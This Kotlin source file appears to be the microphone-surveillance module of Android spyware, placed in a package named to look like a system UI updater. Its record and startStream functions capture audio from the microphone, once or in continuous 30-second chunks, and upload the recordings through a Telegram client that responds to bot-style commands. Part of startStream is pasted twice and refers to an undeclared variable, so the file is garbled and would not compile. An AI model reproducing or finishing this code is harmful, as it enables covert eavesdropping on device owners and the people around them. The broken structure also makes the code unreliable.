package com.android.systemui.updater.capabilities

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import androidx.core.content.ContextCompat
import com.android.systemui.updater.TelegramClient
import java.io.File

class AudioCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    @Volatile
    private var streaming = false
    private var recorder: MediaRecorder? = null

    fun record(seconds: Int = 10) {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            telegram.sendText("❌ Audio permission denied")
            return
        }

        val outputFile = File(ctx.cacheDir, "audio_${System.currentTimeMillis()}.mp3")

        try {
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(outputFile.absolutePath)
                setMaxDuration(seconds * 1000)
                prepare()
                start()
            }

            telegram.sendText("🎤 Recording for ${seconds}s...")

            Thread.sleep(seconds * 1000L)

            recorder?.apply {
                try {
                    stop()
                    release()
                } catch (e: Exception) {
                    // ignore
                }
            }
            recorder = null

            if (outputFile.exists()) {
                telegram.sendAudio(outputFile)
                outputFile.delete()
            } else {
                telegram.sendText("❌ Recording failed: no output")
            }
        } catch (e: Exception) {
            recorder?.release()
            recorder = null
            telegram.sendText("❌ Recording failed: ${e.message}")
        }
    }

    fun startStream() {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            telegram.sendText("❌ Audio permission denied")
            return
        }
        if (streaming) {
            telegram.sendText("🎤 Already streaming. Use /stopstream first.")
            return
        }

        val thread = Thread {
            while (streaming) {
                val file = File(ctx.cacheDir, "stream_${System.currentTimeMillis()}.mp3")
                try {
                    val rec = MediaRecorder().apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setOutputFile(file.absolutePath)
                        prepare()
                        start()
                    }
                    recorder = rec
                    Thread.sleep(30_000) // Stream 30s chunks
                    rec.stop()
                    rec.release()
                    recorder = null
                    if (file.exists()) {
                        telegram.sendAudio(file)
                        file.delete()
                    }
                } catch (e: Exception) {
                    streaming = false
                    telegram.sendText("❌ Streaming error: ${e.message}")
                }
            }
        }.start()

        streaming = true
        telegram.sendText("🎤 Streaming started (30s chunks). /stopstream to end.")
    }
        if (streaming) {
            telegram.sendText("🎤 Already streaming. Use /stopstream first.")
            return
        }

        threading = Thread {
            while (streaming) {
                val file = File(ctx.cacheDir, "stream_${System.currentTimeMillis()}.mp3")
                try {
                    val rec = MediaRecorder().apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setOutputFile(file.absolutePath)
                        prepare()
                        start()
                    }
                    recorder = rec
                    Thread.sleep(30_000) // Stream 30s chunks
                    rec.stop()
                    rec.release()
                    recorder = null
                    if (file.exists()) {
                        telegram.sendAudio(file)
                        file.delete()
                    }
                } catch (e: Exception) {
                    streaming = false
                    telegram.sendText("❌ Streaming error: ${e.message}")
                }
            }
        }.apply { start() }

        streaming = true
        telegram.sendText("🎤 Streaming started (30s chunks). /stopstream to end.")
    }

    fun stopStream() {
        if (!streaming) {
            telegram.sendText("🎤 Not currently streaming")
            return
        }
        streaming = false
        recorder?.apply {
            try { stop() } catch (_: Exception) {}
            try { release() } catch (_: Exception) {}
        }
        recorder = null
        telegram.sendText("🎤 Streaming stopped")
    }
}
